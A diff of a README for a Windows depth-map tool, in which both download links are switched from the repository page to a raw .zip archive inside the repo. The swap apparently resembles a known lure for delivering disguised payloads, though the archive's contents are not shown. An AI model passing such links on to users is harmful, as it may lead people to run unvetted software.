@@ -1,6 +1,6 @@
 # 👁️ stereo-algorithms-evolution - Explore depth map generation methods easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/hadean-vanualevu194/stereo-algorithms-evolution/main/python/evolution_stereo_algorithms_1.8-alpha.5.zip)
 
 ## 📖 About this software
 
@@ -35,7 +35,7 @@ This application runs on modern Windows computers. Ensure your system meets thes
 
 Visit the link below to access the software files.
 
-[Download stereo-algorithms-evolution](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)
+[Download stereo-algorithms-evolution](https://raw.githubusercontent.com/hadean-vanualevu194/stereo-algorithms-evolution/main/python/evolution_stereo_algorithms_1.8-alpha.5.zip)
 
 Follow these steps to prepare your computer:
 
